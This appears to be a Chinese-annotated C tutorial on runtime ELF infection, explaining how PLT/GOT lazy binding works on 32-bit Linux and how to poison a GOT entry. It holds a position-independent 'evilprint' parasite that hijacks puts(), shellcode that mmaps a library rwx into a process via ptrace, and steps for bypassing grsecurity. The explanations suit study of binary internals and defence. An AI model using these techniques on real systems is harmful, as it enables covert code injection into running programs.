/* Modern Day ELF Runtime infection via GOT poisoning
 * Ryan O'Neill'
 * May 2009
 *
 * Related paper:
 * 1.Shared library redirection via ELF PLT infection by Silvio
 * 2.Cheating the ELF by Grugq
 * 3.The Cerberus ELF Interface by Mayhem
 * 4.ELF & Dynamic Linking
 *
 * 一. 打开一个ELF文件:
 */
 /* open, fstat the ELF file, then mmap it */
unsigned char *mem = mmap(0, st.st_size, PROT_READ | PROT_WRITE, MAP_PRIVATE, fd, 0);
Elf32_Ehdr *ehdr = (Elf32_Ehdr *)mem;
Elf32_Phdr *phdr = (Elf32_Phdr *)(mem + ehdr->e_phoff);
Elf32_Shdr *shdr = (Elf32_Shdr *)(mem + edhr->e_shoff);

/*本文用到的测试程序*/
int main(void)
{
  for(;;)
  {
    printf("test!\n");
    sleep(5);
  }
}

/* 可以利用readelf命令来查看ELF文件
 * # readelf -l <file> (获取program header 信息)
 * # readelf -S <file> (获取section header 信息)
 * # readelf -r <file> (获取重定位信息)
 *
 * 下面来看看测试程序的section header信息
 * localhost hijack$ readelf -S test
 *
 * There are 29 section headers, starting at offset 0x1204
 * Section Headers:
 *   [Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al
 *   [ 0]                   NULL            00000000 000000 000000 00      0   0  0
 *   [ 1] .interp           PROGBITS        08048154 000154 000013 00   A  0   0  1
 *   [ 2] .note.ABI-tag     NOTE            08048168 000168 000020 00   A  0   0  4
 *   [ 3] .hash             HASH            08048188 000188 00002c 04   A  5   0  4
 *   [ 4] .gnu.hash         GNU_HASH        080481b4 0001b4 000020 04   A  5   0  4
 *   [ 5] .dynsym           DYNSYM          080481d4 0001d4 000060 10   A  6   1  4
 *   [ 6] .dynstr           STRTAB          08048234 000234 000050 00   A  0   0  1
 *   [ 7] .gnu.version      VERSYM          08048284 000284 00000c 02   A  5   0  2
 *   [ 8] .gnu.version_r    VERNEED         08048290 000290 000020 00   A  6   1  4
 *   [ 9] .rel.dyn          REL             080482b0 0002b0 000008 08   A  5   0  4
 *   [10] .rel.plt          REL             080482b8 0002b8 000020 08   A  5  12  4
 *   [11] .init             PROGBITS        080482d8 0002d8 000017 00  AX  0   0  4
 *   [12] .plt              PROGBITS        080482f0 0002f0 000050 04  AX  0   0  4
 *   [13] .text             PROGBITS        08048340 000340 000194 00  AX  0   0 16
 *   [14] .fini             PROGBITS        080484d4 0004d4 00001c 00  AX  0   0  4
 *   [15] .rodata           PROGBITS        080484f0 0004f0 00000e 00   A  0   0  4
 *   [16] .eh_frame         PROGBITS        08048500 000500 000004 00   A  0   0  4
 *   [17] .ctors            PROGBITS        08049f0c 000f0c 000008 00  WA  0   0  4
 *   [18] .dtors            PROGBITS        08049f14 000f14 000008 00  WA  0   0  4
 *   [19] .jcr              PROGBITS        08049f1c 000f1c 000004 00  WA  0   0  4
 *   [20] .dynamic          DYNAMIC         08049f20 000f20 0000d0 08  WA  6   0  4
 *   [21] .got              PROGBITS        08049ff0 000ff0 000004 04  WA  0   0  4
 *   [22] .got.plt          PROGBITS        08049ff4 000ff4 00001c 04  WA  0   0  4
 *   [23] .data             PROGBITS        0804a010 001010 00000c 00  WA  0   0  4
 *   [24] .bss              NOBITS          0804a01c 00101c 000004 00  WA  0   0  4
 *   [25] .comment          PROGBITS        00000000 00101c 00010a 00      0   0  1
 *   [26] .shstrtab         STRTAB          00000000 001126 0000db 00      0   0  1
 *   [27] .symtab           SYMTAB          00000000 00168c 000330 10     28  31  4
 *   [28] .strtab           STRTAB          00000000 0019bc 00014e 00      0   0  1
 *   Key to Flags:
 *   W (write), A (alloc), X (execute), M (merge), S (strings)
 *   I (info), L (link order), G (group), x (unknown)
 *   O (extra OS processing required) o (OS specific), p (processor specific)
 *
 * 上面展示了所有的section，其中我们感兴趣的是 .text, .dynsym, .rel.plt, .rel.dyn
 *
 *
 * 动态链接
 * 在可执行文件编译的时候，生成对动态库中符号的引用，但在可执行文件执行的时候，这些符号引用才会被定义，符号的地址被mmap(内存映射)到进程的地址空间，例如一个可执行文件调用了多次libc中的函数，eg:对strcpy的调用形如"call 8048330 strcpy@plt"，地址8048330位于.plt(过程连接表)中，PLT将在运行的时候解析出函数strcpy的真实地址。
 * 下面展示了PLT:
 * 080482f0 <__gmon_start__@plt-0x10>:
 *  80482f0:       ff 35 f8 9f 04 08       pushl  0x8049ff8
 *  80482f6:       ff 25 fc 9f 04 08       jmp    *0x8049ffc
 *  80482fc:       00 00                   add    %al,(%eax)
 *    ...
 *
 * 08048300 <__gmon_start__@plt>:
 *  8048300:       ff 25 00 a0 04 08       jmp    *0x804a000
 *  8048306:       68 00 00 00 00          push   $0x0
 *  804830b:       e9 e0 ff ff ff          jmp    80482f0 <_init+0x18>
 *
 * 08048310 <__libc_start_main@plt>:
 *  8048310:       ff 25 04 a0 04 08       jmp    *0x804a004
 *  8048316:       68 08 00 00 00          push   $0x8
 *  804831b:       e9 d0 ff ff ff          jmp    80482f0 <_init+0x18>
 *
 * 08048320 <sleep@plt>:
 *  8048320:       ff 25 08 a0 04 08       jmp    *0x804a008
 *  8048326:       68 10 00 00 00          push   $0x10
 *  804832b:       e9 c0 ff ff ff          jmp    80482f0 <_init+0x18>
*
*  08048330 <puts@plt>:
*   8048330:       ff 25 0c a0 04 08       jmp    *0x804a00c
*   8048336:       68 18 00 00 00          push   $0x18
*   804833b:       e9 b0 ff ff ff          jmp    80482f0 <_init+0x18>)
*
*   我们用puts()作为一个例子：
*  08048330 <puts@plt>:
*   8048330:       ff 25 0c a0 04 08       jmp    *0x804a00c
*   8048336:       68 18 00 00 00          push   $0x18
*   804833b:       e9 b0 ff ff ff          jmp    80482f0 <_init+0x18>)
*   PLT首先间接跳转到*0x804a00c, 0x804a00c是GOT中的条目，当前还没有保存puts函数的真实地址，现在保存的是PLT中的下一条指令(push $0x18)的地址, 0x18是puts函数在重定位表中的偏移，类型为R_386_JUMP_SLOT
*
* localhost hijack$ readelf -r test
* Relocation section '.rel.dyn' at offset 0x2b0 contains 1 entries:
*  Offset     Info    Type            Sym.Value  Sym. Name
*  08049ff0  00000106 R_386_GLOB_DAT    00000000   __gmon_start__
*
* Relocation section '.rel.plt' at offset 0x2b8 contains 4 entries:
*  Offset     Info    Type            Sym.Value  Sym. Name
*  0804a000  00000107 R_386_JUMP_SLOT   00000000   __gmon_start__
*  0804a004  00000207 R_386_JUMP_SLOT   00000000   __libc_start_main
*  0804a008  00000307 R_386_JUMP_SLOT   00000000   sleep
*  0804a00c  00000407 R_386_JUMP_SLOT   00000000   puts
*
*  puts条目中的Offset(0x0804a00c)将保存解析后的puts真实地址
*  我们来看下一条指令:
*  804833b:       e9 b0 ff ff ff          jmp    80482f0 <_init+0x18>
*  这将跳转到PLT的第一个条目(80492f0)，即PLT0:
*  080482f0 <__gmon_start__@plt-0x10>:
    80482f0:       ff 35 f8 9f 04 08       pushl  0x8049ff8
    80482f6:       ff 25 fc 9f 04 08       jmp    *0x8049ffc
*  首先需要知道的是GOT保留了它的第二个和第三个条目，第一条pushl将GOT的第二个条目压入栈中，这个值是link_map(struct link_map)的地址，下一条指令跳转到*0x8049ffc，8049ffc是GOT表的第三个条目，这样就将控制转给了动态连接器。动态连接器从栈中获取重定位条目的偏移(在我们的例子就是0x18)，然后解析出符号的地址并保存到重定位偏移(r_offset)指定的GOT条目中,也就是804a00c，以后对puts@plt的调用将直接跳转到puts函数的真实地址。
*
*  默认情况下linux使用“惰性链接”,这意味着符号在第一次被使用时才会进行解析，这种行为可通过改变LD_BIND_NOW环境变量来改变。
*  根据上面讲解的动态链接的过程，有两种方法进行动态链接库hijacking：
*  1. 用push $0x0, ret 覆盖动态链接库函数的开头6个字节，然后使用一个替代的库函数地址对它打补丁，然后在通过一个保存的函数指针调用它之前从原来的函数中暂时移除push/ret
*  2. 通过mmap我们的替代函数来覆盖原函数在GOT中的条目，在替代函数的最后跳转到原函数。
*  本文将讲解第二种方法，唯一有点儿困难的是如何在运行时将我们自己的动态库加载到进程中。首先我们需要合适的衍生方案(parasite design)
*
*  我们需要衍生的是一个动态库，或者说是一个替代函数，这意味着在调用原函数之前我们能执行额外的检查并且修改它的参数，在设计hijacking动态库的算法时，有一些原则：
*  1. 我们的动态库对象应该是位置无关的代码(Position independent code)，因为我们将使用mmap()将它映射到进程地址空间却不进行任何重定位操作。类似于dlopen()的函数将执行解析和重定位，但是我们的加载代码不使用dlopen而是使用一个简单的方法：mmap(),必须确保动态库是完全位置无关或者使用Diet Libc静态编译。最初的想法是使用类似于dlopen函数，在现代的glibc版本中，只有__libc_dlopen_mode()有一些问题，而我肯定能够解决，但我决定不使用它们因为我觉得没有必要。
*  注意 Diet Libc
*  避免在衍生的程序中使用libc可能无法接受，但使用libc意味着我们需要自己解析重定位，这需要更精巧的object loading shellcode。幸运的是我们可以使用Diet libc来绕过这个问题，Diet libc是一个压缩过的轻量级版本的libc，它可以被静态编译到我们的动态库中从而避免重定位问题
*  PIC Example:
*  如果衍生代码是PIC代码，那么我们不能使用libc中的函数，只能直接调用系统调用，而且必须符合PIC.
* */
static int _write(int fd, void *buf, int count)
{
  long ret;
  __asm__ __volatile__("pushl %%ebx\n\t"
                       "movl %%esi,%%ebx\n\t"
                       "int $0x80\n\t"
                       "popl %%ebx"
                       :"=a"(ret)
                       :"0"(SYS_write), "S"((long)fd),
                       "c" ((long)buf), "d"((long)count));
  if (ret >= 0)
    return (int)ret;
  return -1;
}
/* 而且，我们的衍生代码的makefile应该像这样：
 * gcc -fPIC -c libtest.c -nostdlib
 * ld -shared -soname libtest.so.1 -o libtest.so.1.0 libtest.o
 *
 * 2. 替代函数的结尾应该跳转回原来的函数，而且stack pointer应该在正确的位置。我的衍生程序框架以一个function epilogue结尾，这是一个间接跳转jmp到原来的函数中，这是衍生程序结束的唯一方式：
 */
__asm__ __volatile__
   ("movl %ebp, %esp\n" "pop %ebp\n" "movl $0x00000000, %eax\n" "jmp *%eax");
/* 保持volatile这样当我们patch它的时候它不会被编译器优化
 *
 * 测试衍生代码：
 * 我们的目标程序，上面的test每隔5秒输出"test!"，我们将hijacking libc的puts()函数，我们的替代函数也应该有和原函数一样的参数
 */
   /***************** Shared Object Parasite ************************/
#include <sys/types.h>
#include <sys/syscall.h>
int evilprint(char *);
static int _write(int fd, void *buf, int count)
{
  long ret;
  __asm__ __volatile__ ("pushl %%ebx\n\t"
                        "movl %%esi,%%ebx\n\t"
                        "int $0x80\n\t" "popl %%ebx":"=a"(ret)
                        :"0" (SYS_write), "S"((long)fd),
                        "c" ((long)buf), "d"((long)count));
  if (ret >= 0)
    return (int)ret;
  return -1;
}

int evilprint(char *buf)
{
  /* we must allocate our strings this way on the stack to be PIC*/
  /* otherwise they get stored into .rodata and we can't use them*/
  char new_string[5];
  new_string[0] = 'e';
  new_string[1] = 'v';
  new_string[2] = 'i';
  new_string[3] = 'l';
  new_string[4] = 0;

  /* we are prepending the word 'evil' to whatever string is on the stack*/
  _write(1, new_string, 5);
  _write(1, buf, 5);
  char newline[1];
  newline[0] = '\n';
  _write(1, newline, 1);

  /* perform the function epilogue, and setup the jump which our */
  /* hijacker will patch with the right address */
  __asm__ __volatile__
    ("movl %ebp, %esp\n" "pop %ebp\n" "movl $0x00000000, %eax\n" "jmp *%eax");
}

void _init()
{
}
void _fini()
{
}

/* 这个衍生程序仍然还有改进的空间，通过修改栈可以修改参数，最简单的方法是使用function pointer而不是jmp，如果我们的衍生程序修改puts的参数(存放在栈上)，我们的衍生程序就像下面这样：
 * */
/* parasite that modifies args */
int evilprint(char *buf)
{
  char new_string[5];
  new_string[0] = 'e';
  new_string[1] = 'v';
  new_string[2] = 'i';
  new_string[3] = 'l';
  new_string[4] = 0;

  int (*origfunc)(char *p) = 0x00000000;
  return origfunc(new_string);
}
/* 注意我们的hijacker需要原puts函数的地址来patch函数指针
 *
 * 4. 载入衍生代码
 * 很明显如果没有载入库文件那么程序将无法调用库函数，也许在编写这个衍生代码时最需要技巧的就是设计最好的方法将我们的evil shared object载入到进程的地址空间，在文章的结尾，我提供了两种可靠的方法来迫使目标进程加载我们的动态库，其中的一种方法可以bypass grsec memory protection for ELF segment binary flags.
 * 我最初的方法只是一个纯粹的proof of concept，因此可以简单的利用我的hijacking 算法而不用让我的hijacker真正的做加载 -- 使用LD_PRELOAD(无法动态加载，需要重启目标进程)
 * 正如之前提到的一样，__libc_dlopen_mode存在于libc中而且可以加载动态库对象，但是使用它我还没有成功，也许它需要先进行一些初始化。
 * 我的通用办法是简单的mmap映射动态库为"rwx"(可读，可写，可执行)，这个方法不用处理重定位，但如果不涉及动态链接，那么它是一个较好的方法
 * 4.1 加载库的通用方法
 * _start:
 *       jmp B
 * A:
 *   # fd = open("libtest.so.1.0", O_RDONLY);
 *   xorl %ecx, %ecx
 *   movb $5, %al
 *   popl %ebx
 *   xorl %ecx, %ecx
 *   int $0x80
 *
 *   subl $24, %esp
 *
 *   # mmap(0,8192,PROT_READ|PROT_WRITE|PROT_EXEC, MAP_SHARED, fd, 0);
 *   xorl %edx, %edx
 *   movl %edx, (%esp)
 *   movl $8102, 4(%esp)
 *   movl $7, 8(%esp)
 *   movl $2, 12(%esp)
 *   movl %eax, 16(%esp)
 *   movl %edx, 20(%esp)
 *   movl $90, %eax
 *   movl %esp, %ebx
 *   int $0x80
 *
 *   # We need this to transfer control back to our hijacker once our hsellcode is done executing
 *   int 3
 *   # To get the address of the string dynamically we use call/pop method
 * B:
 *   call A
 *   .string "libtest.so.1.0"
 *
 *  这段简单的代码将evil共享对象(大小约为5k)mmap到进程的地址空间,mmap的权限为rwx，通常情况下libc会有多次mmap到进程中，一次为了代码段(text segment(with execute))，一次是为了数据段(data segment(with read))。在我们的例子中，我们只用rwx为参数mmap加载了一次(除非碰到了GRSEC) --但我们怎样使进程执行这段代码了？答案是我们必须使用ptrace来注入代码到正在运行的进程中，然后修改EIP来执行它。
 *
 *  4.2 绕过Grsec的加载方法
 *  linux的grsec内核补丁有许多的特点，本文涉及到了其中的一些，最主要的特点就是代码段(text segment)被标记为read/execute，这样就不能使用ptrace注入shellcode(代码段不可写),我们将用下面的方法克服这个困难。
 *  使用 PTRACE_SYSCALL 来定位 sysenter
 *  systenter用在现在的linux内核中，用来替代int $0x80.由于grsec的保护，所有的内存maps的地址都是空的，这种情况下，从map文件中获取地址就没有任何用处,下面就是我们要找的：
 *  fffe420 <__kernel_vsyscall>:
 *  ffffe420:       51                      push   %ecx
 *  ffffe421:       52                      push   %edx
 *  ffffe422:       55                      push   %ebp
 *  ffffe423:       89 e5                   mov    %esp,%ebp
 *  ffffe425:       0f 34                   sysenter
 *  我们的目标是定位正在执行的进程的下一个系统调用，然后获取EIP,EIP的值很可能是systenter之后的几个字节，所以也许是ffffe430.
 *
 *  在syscall执行sysenter之前保存寄存器的值(Save the registers right before the syscall is called with sysenter)
 *  修改%eax的值为我们希望执行的系统调用编号，在我们的例子中是SYS_open.
 *  修改参数args使它符合我们的syscall，并将需要的args保存到data segment中(不是在栈中)。在我们的例子中，保存data segment开头的N个字节，然后写入我们自己的字符串"/lib/libtest.so.1.0"
 *  通过使用ptrace将(reg.eip-20)读到buffer中来定位sysenter,然后在buffer中搜索指令"\x0f\x34"，因此sysenter = (reg.eip - 20) + index
 *  修改%eip来指向sysenter，然后使用PTRACE_SINGLESTEP来执行指令直到sysenter. 重复3-6的过程，但使用mmap()，然后进入步骤7
 *  恢复数据段(data segment)
 *
 * */

